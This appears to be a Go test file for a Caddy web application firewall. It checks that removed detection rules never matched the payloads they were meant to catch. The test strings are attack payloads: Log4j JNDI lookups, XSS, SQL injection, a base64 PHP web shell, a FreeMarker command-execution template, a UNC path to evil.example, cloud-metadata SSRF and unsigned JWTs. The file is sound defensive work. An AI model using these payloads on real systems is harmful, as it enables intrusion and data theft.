package caddywaf

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"testing"
	"time"

	"github.com/caddyserver/caddy/v2/modules/caddyhttp"
	"github.com/phemmer/go-iptrie"
	"github.com/stretchr/testify/assert"
	"go.uber.org/zap"
)

// This file pins the removal of rules that could never fire. Each entry below
// is the exact pattern of a rule that was shipped in rules.json,
// rules-browser-friendly.json or a rules/ bundle, paired with the payload the
// rule's own description says it detects. The assertion is that the pattern
// does not match that payload, so deleting the rule loses no coverage.

func TestRemovedRulesNeverMatchedTheirOwnPayload(t *testing.T) {
	cases := []struct {
		id, pattern, payload, why string
	}{
		// "$" is an end-of-text anchor, so anything after it is unmatchable.
		{"rce-9", `(?i)$(whoami)`, `$(whoami)`, "mid-pattern $ anchor"},
		{"log4j-14", `(?i)${jndi:ldap://example.com/a}`, `${jndi:ldap://example.com/a}`, "mid-pattern $ anchor"},
		{"log4j-15", `(?i)${jndi:rmi://example.com/b}`, `${jndi:rmi://example.com/b}`, "mid-pattern $ anchor"},
		{"log4j-16", `(?i)${jndi:dns://example.com/c}`, `${jndi:dns://example.com/c}`, "mid-pattern $ anchor"},
		// "(1)" is a capture group matching the character 1, not the literal "(1)".
		{"xss-0", `(?i)<script>alert(1)</script>`, `<script>alert(1)</script>`, "unescaped parens"},
		{"xss-1", `(?i)<img src=x onerror=alert(1)>`, `<img src=x onerror=alert(1)>`, "unescaped parens"},
		{"xss-2", `(?i)javascript:alert(1)`, `javascript:alert(1)`, "unescaped parens"},
		// "* " quantifies the preceding space; the literal "*" is never matched.
		{"sqli-5", `(?i)'; SELECT * FROM users;`, `'; SELECT * FROM users;`, "unescaped star"},
		// A real data: URI has no "//" after the scheme.
		{"lfi-data-wrapper", `(?i)data:\/\/(?:text|plain|application)\/(?:base64,)?.*`,
			`data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`, "requires data://"},
		{"rfi-data-uri", `(?i)data:\/\/(?:text|plain|application)\/.*?base64,.*`,
			`data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`, "requires data://"},
		// Four literal backslashes are required; a UNC path has two.
		{"lfi-windows-cifs", `(?i)(?:\\\\\\\\\w+)`, `\\evil.example\share\payload.dll`, "over-escaped"},
		// FreeMarker directives are <#...> and never end in "#>".
		{"ssti-freemarker-directive", `(?i)<#.*?#>`,
			`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`, "wrong delimiter"},
		// The pattern demands "=" right after "//node[" (optionally "@attr"); real
		// XPath injection carries a predicate expression there.
		{"sqli-xpath-injection",
			`(?i)/(?:\/\w+)+(\[|\|)(?i)\s*(?:\@(?:\w+)|\.)*\s*(?:=|!=|<|>)["']?.*["']?\s*(\]|\|)`,
			`//user[name/text()='admin' or '1'='1']`, "wrong shape"},
		{"sqli-xpath-injection",
			`(?i)/(?:\/\w+)+(\[|\|)(?i)\s*(?:\@(?:\w+)|\.)*\s*(?:=|!=|<|>)["']?.*["']?\s*(\]|\|)`,
			`' or '1'='1`, "wrong shape"},
		// Requires "{" immediately followed by a bare "query"; JSON batching is
		// an array of {"query": ...} objects.
		{"graphql-batching", `(?i)(?:\{(?:\s*(?:query|mutation|fragment)\s*\w*\s*\{.*?\})\s*\}\s*){2,}`,
			`[{"query":"query A { user(id:1) { name } }"},{"query":"query B { user(id:2) { name } }"}]`, "JSON never bare"},
		// "^" is anchored against the whole ARGS string ("k=v") or the URI
		// ("/path"), neither of which starts with a scheme.
		{"ssrf-protocol-whitelist", `^(?i)(?:http|https)://.*$`, `url=http://169.254.169.254/latest/meta-data/`, "anchored"},
		{"ssrf-protocol-whitelist", `^(?i)(?:http|https)://.*$`, `/fetch?url=http://169.254.169.254/`, "anchored"},
		// A well-formed query string always has "&" between pairs, which the
		// second repetition cannot consume.
		{"hpp-duplicate-parameters", `(?i)(?:\w+=\w*&\w+=\w*){2,}`, `id=1&id=2`, "needs adjacent pairs"},
		{"hpp-duplicate-parameters", `(?i)(?:\w+=\w*&\w+=\w*){2,}`, `a=1&b=2&c=3&d=4`, "needs adjacent pairs"},
		// "^eyJ" is anchored against "Bearer eyJ..." (Authorization) or
		// "name=eyJ..." (COOKIES), so the anchor never lines up with the token.
		{"jwt-tampering", `^(eyJ[A-Za-z0-9_-]{0,}\.eyJ[A-Za-z0-9_-]{0,}\.[A-Za-z0-9_-]{0,})`,
			`Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.`, "anchored behind prefix"},
		{"jwt-tampering", `^(eyJ[A-Za-z0-9_-]{0,}\.eyJ[A-Za-z0-9_-]{0,}\.[A-Za-z0-9_-]{0,})`,
			`session=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.`, "anchored behind prefix"},
		{"auth-jwt-no-signature", `^(?:[a-zA-Z0-9_-]+\.){2}[a-zA-Z0-9_-]*$`,
			`Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.`, "anchored behind prefix"},
		{"auth-jwt-no-signature", `^(?:[a-zA-Z0-9_-]+\.){2}[a-zA-Z0-9_-]*$`,
			`token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.`, "anchored behind prefix"},
	}
	for _, c := range cases {
		re, err := regexp.Compile(c.pattern)
		if err != nil {
			t.Fatalf("%s: pattern does not compile: %v", c.id, err)
		}
		assert.Falsef(t, re.MatchString(c.payload), "%s (%s) matched its advertised payload %q", c.id, c.why, c.payload)
	}
}

// deadRuleMiddleware loads a rule file the way the shipped tests do, with the
// default anomaly threshold, so the assertions below go through ServeHTTP.
func deadRuleMiddleware(t *testing.T, rulesJSON string) *Middleware {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "rules.json")
	if err := os.WriteFile(path, []byte(rulesJSON), 0o600); err != nil {
		t.Fatal(err)
	}
	logger := zap.NewNop()
	m := &Middleware{
		logger: logger, blacklistLoader: NewBlacklistLoader(logger),
		AnomalyThreshold: 5, ruleCache: NewRuleCache(), ipBlacklist: iptrie.NewTrie(),
		dnsBlacklist: map[string]struct{}{}, ruleHitsByPhase: map[int]int64{},
		RuleFiles:             []string{path},
		requestValueExtractor: NewRequestValueExtractor(logger, false, 0),
		provisionTime:         time.Now(), topIPsBlocked: map[string]int64{},
		blockedByReason: map[string]int64{}, geoIPStats: map[string]int64{},
	}
	if err := m.loadRules(m.RuleFiles); err != nil {
		t.Fatalf("loadRules: %v", err)
	}
	return m
}

var deadRuleNext = caddyhttp.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) error {
	w.WriteHeader(http.StatusOK)
	return nil
})

func deadRuleServe(t *testing.T, m *Middleware, r *http.Request) int {
	t.Helper()
	r.RemoteAddr = "203.0.113.9:1234"
	rec := httptest.NewRecorder()
	_ = m.ServeHTTP(rec, r, deadRuleNext)
	return rec.Code
}

// TestEmptyPatternRulesNeverFire pins the engine behaviour the "^$" presence
// rules relied on: a missing header or an empty body makes the extractor
// return an error and the rule is skipped for that target, so "^$" is never
// evaluated against an empty string. Every removed "^$" rule is exercised here
// with block/score 10 so a single match would show up as a 403.
func TestEmptyPatternRulesNeverFire(t *testing.T) {
	m := deadRuleMiddleware(t, `[
	  {"id":"auth-login-form-missing","phase":2,"pattern":"^$","targets":["BODY"],"severity":"LOW","action":"block","score":10,"description":""},
	  {"id":"csrf-missing-token-post","phase":2,"pattern":"^$","targets":["BODY"],"severity":"LOW","action":"block","score":10,"description":""},
	  {"id":"auth-no-cookies-set","phase":2,"pattern":"^$","targets":["HEADERS:Set-Cookie"],"severity":"LOW","action":"block","score":10,"description":""},
	  {"id":"browser-integrity-sec-fetch-dest-missing-block","phase":1,"pattern":"^$","targets":["HEADERS:Sec-Fetch-Dest-Presence-Check"],"severity":"LOW","action":"block","score":10,"description":""},
	  {"id":"browser-integrity-sec-fetch-mode-missing-log-score","phase":1,"pattern":"^$","targets":["HEADERS:Sec-Fetch-Mode-Presence-Check"],"severity":"LOW","action":"block","score":10,"description":""},
	  {"id":"browser-integrity-sec-fetch-site-missing-log-score","phase":1,"pattern":"^$","targets":["HEADERS:Sec-Fetch-Site-Presence-Check"],"severity":"LOW","action":"block","score":10,"description":""},
	  {"id":"browser-integrity-sec-fetch-user-missing-log-score","phase":1,"pattern":"^$","targets":["HEADERS:Sec-Fetch-User-Presence-Check"],"severity":"LOW","action":"block","score":10,"description":""},
	  {"id":"browser-integrity-sec-fetch-dest-not-document-ua-suspicious-log-score","phase":1,"pattern":"(?i)^(?:script|style|image|font|fetch|xhr|audio|video|manifest|object|embed|report|worker|sharedworker|serviceworker|empty|unknown)$","targets":["HEADERS:Sec-Fetch-Dest-Not"],"severity":"LOW","action":"block","score":10,"description":""},
	  {"id":"positive-control","phase":1,"pattern":"^control$","targets":["HEADERS:X-Control"],"severity":"LOW","action":"block","score":10,"description":""}
	]`)

	t.Run("positive control: a matching header rule does block", func(t *testing.T) {
		r := httptest.NewRequest(http.MethodGet, "/", nil)
		r.Header.Set("X-Control", "control")
		assert.Equal(t, http.StatusForbidden, deadRuleServe(t, m, r))
	})

	t.Run("no Sec-Fetch headers, no body, no cookies", func(t *testing.T) {
		r := httptest.NewRequest(http.MethodGet, "/", nil)
		r.Header.Set("User-Agent", "curl/8.0")
		assert.NotEqual(t, http.StatusForbidden, deadRuleServe(t, m, r))
	})
	t.Run("POST with an empty body", func(t *testing.T) {
		r := httptest.NewRequest(http.MethodPost, "/login", nil)
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		assert.NotEqual(t, http.StatusForbidden, deadRuleServe(t, m, r))
	})
	t.Run("subresource fetch with Sec-Fetch-Dest image", func(t *testing.T) {
		r := httptest.NewRequest(http.MethodGet, "/logo.png", nil)
		r.Header.Set("Sec-Fetch-Dest", "image")
		r.Header.Set("Sec-Fetch-Mode", "no-cors")
		r.Header.Set("Sec-Fetch-Site", "cross-site")
		assert.NotEqual(t, http.StatusForbidden, deadRuleServe(t, m, r))
	})
}

// TestNullBytePatternNeverMatches pins why sqli-null-byte was dead: the default
// transformation chain URL-decodes and then strips NUL, so "%00" is gone from
// the normalized value and the raw value only ever contains the literal "%00".
// A raw NUL in a header or URL is rejected by net/http before the WAF runs.
func TestNullBytePatternNeverMatches(t *testing.T) {
	m := deadRuleMiddleware(t, `[
	  {"id":"sqli-null-byte","phase":2,"pattern":"(?i)\\x00","targets":["ARGS","BODY","HEADERS","REQUEST_COOKIES"],"severity":"LOW","action":"block","score":10,"description":""},
	  {"id":"positive-control","phase":2,"pattern":"(?i)control","targets":["ARGS"],"severity":"LOW","action":"block","score":10,"description":""}
	]`)
	r := httptest.NewRequest(http.MethodGet, "/", nil)
	r.URL.RawQuery = "q=admin%00'%20or%201=1"
	r.RequestURI = "/?q=admin%00'%20or%201=1"
	assert.NotEqual(t, http.StatusForbidden, deadRuleServe(t, m, r))

	r = httptest.NewRequest(http.MethodGet, "/", nil)
	r.URL.RawQuery = "q=control%00"
	r.RequestURI = "/?q=control%00"
	assert.Equal(t, http.StatusForbidden, deadRuleServe(t, m, r), "positive control: ARGS rule must block")
}
